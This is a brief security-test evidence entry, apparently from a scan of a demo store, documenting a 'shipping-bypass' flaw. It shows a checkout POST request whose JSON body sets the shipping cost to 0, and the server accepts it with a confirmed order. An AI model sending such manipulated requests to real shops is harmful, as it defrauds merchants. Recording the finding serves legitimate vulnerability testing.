## Evidence: shipping-bypass

### Request
POST /api/v1/orders/checkout HTTP/1.1
Host: duck-store.escape.tech
Content-Type: application/json

{"ShippingInfo":{"method":"express","cost":0}}

### Response
HTTP/1.1 200 OK
Content-Type: application/json

{"order_id":501,"shipping_cost":0,"status":"confirmed"}

### Analysis
Manipulated ShippingInfo bypassed the required shipping cost during checkout.
